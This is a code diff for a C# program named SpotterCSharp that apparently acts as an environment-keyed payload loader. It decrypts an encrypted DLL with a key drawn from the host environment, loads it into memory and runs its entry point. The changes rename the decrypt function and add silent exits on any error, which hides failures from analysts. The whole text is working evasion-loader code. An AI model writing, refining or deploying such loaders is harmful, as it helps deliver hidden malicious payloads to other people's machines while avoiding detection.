@@ -1,6 +1,5 @@
 using System;
 using System.IO;
-using System.Management;
 using System.Reflection;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
@@ -23,12 +22,12 @@ namespace SpotterCSharp
             try
             {
                 string plaintext = null;
-                plaintext = Decrypt(keyBytes, newIV, encDllBytes);
+                plaintext = DecrypterFunction(keyBytes, newIV, encDllBytes);
                 InjectAssembly(plaintext);
             }
             catch (Exception)
             {
-                System.Environment.Exit(1);
+                Environment.Exit(1);
             }
         }
 
@@ -47,7 +46,7 @@ namespace SpotterCSharp
             return envKey;
         }
 
-        private static string Decrypt(byte[] keyBytes, byte[] newIV, byte[] newCipherText)
+        private static string DecrypterFunction(byte[] keyBytes, byte[] newIV, byte[] newCipherText)
         {
             byte[] key = keyBytes;
             byte[] iv = newIV;
@@ -87,15 +86,21 @@ namespace SpotterCSharp
             }
             catch (CryptographicException e)
             {
+                Environment.Exit(1);
                 return null;
             }
         }
         private static void InjectAssembly(string assemblyB64)
         {
-            var bytes = Convert.FromBase64String(assemblyB64);
-            var assembly = Assembly.Load(bytes);
-            MethodInfo method = assembly.EntryPoint;
-            method.Invoke(null, null);
+            try
+            {
+                var bytes = Convert.FromBase64String(assemblyB64);
+                var assembly = Assembly.Load(bytes);
+                MethodInfo method = assembly.EntryPoint;
+                method.Invoke(null, new object[] {new string[] { } });
+            }
+            catch { Environment.Exit(1); }
+
         }
 
         [DllImport("kernel32.dll")]
